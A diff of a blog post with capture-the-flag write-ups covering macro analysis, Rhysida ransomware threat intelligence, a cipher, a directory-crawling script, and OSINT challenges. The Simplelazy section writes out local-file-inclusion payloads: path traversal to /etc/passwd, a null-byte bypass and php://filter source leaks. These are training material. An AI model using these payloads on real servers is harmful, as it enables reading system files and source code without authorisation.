@@ -2,7 +2,7 @@
 layout: "post"
 title: "rENTAS CTF"
 categories: [rENTAS_CTF]
-tags: "RE TI olevba rhysida"
+tags: "RE TI Cryptography Web OSINT olevba rhysida pizzini DirectoryTraversal LFI PHPwrapper GoogleDorking metadata"
 image: /assets/CTF/rENTAS_CTF/logo.jpg
 ---
 
@@ -13,7 +13,7 @@ image: /assets/CTF/rENTAS_CTF/logo.jpg
 ![light mode only](/assets/CTF/rENTAS_CTF/RE/chal.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
 ![dark mode only](/assets/CTF/rENTAS_CTF/RE/chal.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
 
-**Solution**
+**Solution:**
 
 In this challenge, we were provided with a Word document. We used `olevba`, a tool commonly used for examining Microsoft Office documents for malicious content. It helps in extracting and analyzing macros embedded in the file.
 
@@ -30,7 +30,7 @@ Among the extracted strings, we discovered a base64 encoded string. After decodi
 ![light mode only](/assets/CTF/rENTAS_CTF/RE/cyberchef.jpeg){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
 ![dark mode only](/assets/CTF/rENTAS_CTF/RE/cyberchef.jpeg){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
 
-**Flag**
+**Flag:**
 
 `RWSC{p@ss123}`
 
@@ -71,7 +71,7 @@ S_2.bat
 Executes conhost.exe on compromised victim systems, which encrypts and appends the extension of .groupname(sensored) across the environment.
 ```
 
-**Solution**
+**Solution:**
 
 We performed an online search using one of the hashes and confirmed that the hash belonged to `Rhysida Ransomware`. Next, we searched through various platforms to gather more information about Rhysida Ransomware. During our search, we found a crucial clue on a Telegram channel. The clue indicated that the challenge creators preferred using `mirrors` over direct domains.
 
@@ -87,9 +87,223 @@ We proceeded to search for mirrors related to Rhysida Ransomware. Our top search
 
 The Twitter post contained an `.onion` domain. According to the clue, the content before the `.onion` domain in the post constituted the flag
 
-**Flag**
+**Flag:**
 
 `RWSC{rhysidafc6lm7qa2mkiukbezh7zuth3i4wof4mh2audkymscjm6yegad}`
 
+## Crypto/round and round
+
+**Challenge Description:**
+
+In this challenge, we were provided with an encoded message:
+```text
+2126226{19122929121712_6121911821_26422_842928}
+```
+**Solution:**
+
+The challenge description reveals the cipher name: `Pizzini Cipher`.
+
+We used the Pizzini Cipher decoder tool at this [link](https://www.cachesleuth.com/pizzini.html)
+
+![light mode only](/assets/CTF/rENTAS_CTF/Crypto/pizzini.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/Crypto/pizzini.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+**Flag:**
+
+RWSC{PIZZINI_CIPHER_WAS_EAZY}
+
+## Web/Build Your Own Script
+
+**Challenge Description:**
+
+![light mode only](/assets/CTF/rENTAS_CTF/Web/chal.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/Web/chal.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+We were presented with a website that generates random directories represented by emojis. Each directory contained sub-directories, and the path ends with an index.php page. Upon browsing the website, we observed the following:
+- The website generates directories represented by emojis.
+- These directories contain sub-directories, leading to more sub-directories.
+- Each path ends with an index.php page.
+- Random inspirational quotes are displayed as we navigate through different directories.
+
+![light mode only](/assets/CTF/rENTAS_CTF/Web/directories.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/Web/directories.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+**Solution:**
+
+Our first attempt involved checking each directory for the flag. However, this approach faced issues due to the dynamic generation of new directories. After that, we realized it performed a check on the pages for the text `"No directories found."` This suggested that a unique directory would not contain this text.
+
+We wrote a Python script using the `requests` library to fetch directory contents and the `BeautifulSoup` library to parse the HTML. 
+
+```python
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+
+def fetch_directory_contents(url):
+    try:
+        response = requests.get(url)
+        response.raise_for_status()  # Raise exception for HTTP errors
+        return response.text
+    except requests.RequestException as e:
+        print(f"Error fetching {url}: {e}")
+        return None
+
+def find_unique_directory(base_url):
+    directories_to_check = [base_url]
+    unique_directory = None
+
+    while directories_to_check:
+        current_url = directories_to_check.pop()
+        content = fetch_directory_contents(current_url)
+
+        if content:
+            soup = BeautifulSoup(content, 'html.parser')
+            directory_links = soup.find_all('a', class_='directory-link')
+            no_dir_text = soup.find(string="No directories found.")
+
+            if directory_links:
+                for link in directory_links:
+                    link_url = urljoin(current_url, link['href'])
+                    directories_to_check.append(link_url)
+            elif not no_dir_text:  # Check for existence of directory content
+                unique_directory = current_url
+                break
+
+    return unique_directory
+
+if __name__ == "__main__":
+    base_url = "https://byos.ctf.rawsec.com/root/index.php"
+    unique_dir = find_unique_directory(base_url)
+    if unique_dir:
+        print(f"Unique directory found: {unique_dir}")
+    else:
+        print("No unique directory found.")
+```
+
+The script recursively traverses directories until it finds a unique directory. It will traverse all possible directory paths on the provided URL `https://byos.ctf.rawsec.com/root/index.php`.
+![light mode only](/assets/CTF/rENTAS_CTF/Web/found.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/Web/found.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+We navigated to the unique directory URL provided by the script. The page contained the flag:
+![light mode only](/assets/CTF/rENTAS_CTF/Web/flag.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/Web/flag.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+**Flag:**
+
+`RWSC{J4CKP0T}`
+
+## Web/Simplelazy
+
+**Challenge Description:**
+We encountered a website with three clickable links, each leading to different result. 
+
+![light mode only](/assets/CTF/rENTAS_CTF/Web/link.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/Web/link.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+**Solution:**
+
+`https://simplelazy.ctf.rawsec.com/index.php?page=page1https://simplelazy.ctf.rawsec.com/index.php?page=page1`
+
+This is the link when we click each “link” at the page. Immediately we are thinking about LFI vulnerability. 
+
+We tested the `page` parameter by attempting to access the `/etc/passwd` file. 
+
+`https://simplelazy.ctf.rawsec.com/index.php?page=../../../../../../../../../../../etc/passwd`
+
+We tried to grab the /etc/passwd directory but not successful, it shows /etc/passwd.php not found.
+
+>Warning: include(../../../../../../../../../../../etc/passwd.php): Failed to open stream: No such file or directory in /var/www/html/index.php on line 72
+{: .prompt-danger }
+
+Next, we attempted to bypass the .php extension by using a `null byte (%00)`, which in some cases can terminate the string early:
+
+`https://simplelazy.ctf.rawsec.com/index.php?page=../../../../../../../../../../../etc/passwd%00`
+
+>Warning: include(): Failed opening '../../../../../../../../../../../etc/passwd' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 72
+{: .prompt-danger }
+
+This indicated the null byte was processed, but the file still couldn't be accessed.
+
+We then considered using [PHP wrappers](https://gupta-bless.medium.com/exploiting-local-file-inclusion-lfi-using-php-wrapper-89904478b225) to manipulate the file inclusion.
+
+`https://simplelazy.ctf.rawsec.com/index.php?page=php://filter/convert.base64-encode/resource=index`
+
+![light mode only](/assets/CTF/rENTAS_CTF/Web/base64.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/Web/base64.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+This successfully returned the base64-encoded content, and we decoded it using CyberChef.
+![light mode only](/assets/CTF/rENTAS_CTF/Web/cyberchef.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/Web/cyberchef.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+After some further inspections, we used the same PHP wrapper method to retrieve the base64-encoded content of `page3`
+
+`https://simplelazy.ctf.rawsec.com/index.php?page=php://filter/convert.base64-encode/resource=page3`
+
+We got a base64 and decoding the base64 content of page3 revealed additional information.
+![light mode only](/assets/CTF/rENTAS_CTF/Web/page3.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/Web/page3.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+We tried to put `"esdasxasdcessxsadx"` to the payload:
+
+`https://simplelazy.ctf.rawsec.com/index.php?page=php://filter/convert.base64-encode/resource=esdasxasdcessxsadx`
+
+Finally, this payload successfully retrieved the flag.
+
+![light mode only](/assets/CTF/rENTAS_CTF/Web/SimplelazyFlag.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/Web/SimplelazyFlag.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+**Flag:**
+
+`RWSC{S1MPL3_4ND_L4ZY}`
+
+## OSINT/Cali Cartel
+
+**Solution:**
+
+The key hint provided was the word `"downfall"`. We started to search for the `downfall of Cali Cartel`. There are several results, including a Wikipedia page and an article from The Seattle Times.
+
+![light mode only](/assets/CTF/rENTAS_CTF/OSINT/search.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/OSINT/search.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+The Wikipedia page provided general information but no specific leads for our challenge. However, the article from The Seattle Times caught our attention. The article discussed the downfall of the Cali Cartel and a name stood out quite clearly: `Jorge Salcedo`
+
+![light mode only](/assets/CTF/rENTAS_CTF/OSINT/name.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/OSINT/name.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+So we tried the name paired with Google Dorking to increase the effectiveness. Ta-da! The flag is just right there.
+
+![light mode only](/assets/CTF/rENTAS_CTF/OSINT/flag.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/OSINT/flag.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+**Flag:**
+
+`RWSC{C4L1_C4RT3L_PWN3D}`
+
+## OSINT/Medellín Cartel
+
+**Solution:**
+
+We can't really solve this challenge without the hint:
+![light mode only](/assets/CTF/rENTAS_CTF/OSINT/hint.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/OSINT/hint.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+The hint indicated that the flag was hidden within the metadata of an Instagram Account. We started by navigating to the UNITEN official Instagram account. The goal was to identify the specific follower mentioned in the hint. By reviewing the followers list of the UNITEN official Instagram account, we located the mentioned person from the hint.
+
+![light mode only](/assets/CTF/rENTAS_CTF/OSINT/follower.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/OSINT/follower.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+The account had only one post and we needed to examine this post's metadata. 
+
+![light mode only](/assets/CTF/rENTAS_CTF/OSINT/post.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/OSINT/post.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+To inspect the metadata, we viewed the source code of the Instagram post and search for flag pattern.
+
+![light mode only](/assets/CTF/rENTAS_CTF/OSINT/metadata.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
+![dark mode only](/assets/CTF/rENTAS_CTF/OSINT/metadata.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
+
+**Flag:**
+
+`RWSC{Bl4cky_S1c4r1o}`
 
 
